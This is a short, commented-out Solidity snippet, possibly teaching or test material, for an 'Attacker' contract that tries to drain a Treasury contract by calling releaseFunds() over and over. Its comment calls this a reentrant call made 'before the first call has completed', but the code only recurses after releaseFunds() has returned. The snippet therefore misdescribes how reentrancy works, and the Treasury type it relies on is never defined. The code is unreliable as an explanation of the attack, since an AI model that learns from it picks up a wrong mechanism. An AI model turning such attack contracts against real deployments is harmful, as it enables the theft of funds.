/*
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/access/Ownable.sol";
//import "@openzeppelin/test-helpers/contracts/Assert.sol";

contract Attacker is Ownable {
    Treasury public treasury;

    constructor(address _treasury) public {
        treasury = Treasury(_treasury);
    }

    function attack() public {
        // Attacker calls the releaseFunds function
        treasury.releaseFunds();

        // Attacker calls the attack function again before the first call has completed
        attack();
    }
}
*/